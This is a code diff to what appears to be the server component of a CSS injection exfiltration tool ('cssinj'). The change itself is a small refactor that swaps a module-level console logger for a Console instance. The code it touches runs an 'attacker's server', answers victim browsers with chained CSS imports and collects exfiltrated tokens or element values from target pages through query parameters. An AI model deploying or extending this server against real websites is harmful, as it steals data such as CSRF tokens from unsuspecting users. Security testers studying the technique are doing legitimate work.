@@ -1,7 +1,8 @@
 from aiohttp import web
 import asyncio
-from cssinj import console, injection
+from cssinj import injection
 from cssinj.client import Client, Clients
+from cssinj.console import Console
 
 
 class CSSInjector:
@@ -16,10 +17,12 @@ class CSSInjector:
         self.selector = args.selector
         self.app = web.Application()
         self.app.middlewares.append(self.dynamic_router_middleware)
+        self.console = Console()
+
         web.run_app(
             self.app,
             port=self.port,
-            print=console.log(
+            print=self.console.log(
                 "server", f"Attacker's server started on {args.hostname}:{args.port}"
             ),
         )
@@ -32,12 +35,12 @@ class CSSInjector:
             event=asyncio.Event(),
         )
         self.clients.append(client)
-        console.log("connection", f"Connection from {client.host}")
-        console.log("connection_details", f"ID : {client.id}")
+        self.console.log("connection", f"Connection from {client.host}")
+        self.console.log("connection_details", f"ID : {client.id}")
         client.event.set()
         if self.show_details:
             for key, value in request.headers.items():
-                console.log("connection_details", f"{key} : {value}")
+                self.console.log("connection_details", f"{key} : {value}")
 
         return web.Response(
             text=injection.generate_next_import(self.hostname, self.port, client),
@@ -45,13 +48,12 @@ class CSSInjector:
         )
 
     async def handle_end(self, request):
-
         client_id = request.query.get("id")
         client = self.clients[client_id]
         client.elements.append(client.data)
         client.event.set()
 
-        console.log(
+        self.console.log(
             "end_exfiltration",
             f"[{client.id}] - The {self.selector} exfiltrated from {self.identifier} is : {client.data}",
         )
@@ -90,7 +92,7 @@ class CSSInjector:
         client.data = request.query.get("token")
 
         if self.show_details:
-            console.log(
+            self.console.log(
                 "exfiltration",
                 f"[{client.id}] - Exfiltrating element {len(client.elements)} : {client.data}",
             )
